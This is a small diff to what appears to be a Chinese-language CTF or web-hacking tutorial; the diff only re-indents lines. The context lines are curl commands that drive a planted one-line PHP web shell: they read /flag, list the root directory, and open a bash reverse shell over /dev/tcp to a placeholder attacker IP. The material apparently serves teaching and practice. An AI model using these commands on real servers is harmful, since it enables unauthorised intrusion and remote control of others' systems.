@@ -42,11 +42,11 @@ curl -X POST "http://target.com/shell.php" -d "cmd=system('cat /flag');"
 
 # 一句话木马 - 反弹 shell（攻击机 nc -lvp 4444）
 curl -X POST "http://target.com/shell.php" \
-  -d "cmd=system('bash -i >& /dev/tcp/攻击机IP/4444 0>&1');"
+ -d "cmd=system('bash -i >& /dev/tcp/攻击机IP/4444 0>&1');"
 
 # 一句话木马 - 查看文件
 curl -X POST "http://target.com/shell.php" \
-  -d "cmd=system('ls -la /');"
+ -d "cmd=system('ls -la /');"
 ```
 
 ### 关联教程
